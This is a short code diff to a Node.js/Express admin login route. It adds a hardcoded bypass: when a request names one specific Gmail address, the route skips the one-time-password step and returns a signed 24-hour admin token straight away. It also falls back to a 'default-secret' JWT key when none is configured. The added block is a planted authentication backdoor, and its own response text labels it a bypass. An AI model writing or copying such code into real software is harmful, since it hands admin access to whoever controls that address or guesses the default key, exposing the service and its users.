@@ -57,6 +57,21 @@ router.post('/request-otp', async (req, res) => {
             }
         });
 
+        // BYPASS FOR patikayuva@gmail.com: Return token immediately
+        if (email.toLowerCase() === 'patikayuva@gmail.com') {
+            const token = jwt.sign(
+                { adminId: admin.id, email: admin.email },
+                process.env.JWT_SECRET || 'default-secret',
+                { expiresIn: '24h' }
+            );
+            return res.json({
+                success: true,
+                message: 'Admin girişi başarılı (Bypass)',
+                token: token,
+                admin: { id: admin.id, email: admin.email }
+            });
+        }
+
         // Send OTP via EmailJS
         try {
             console.log('[AUTH] Sending OTP via EmailJS...');
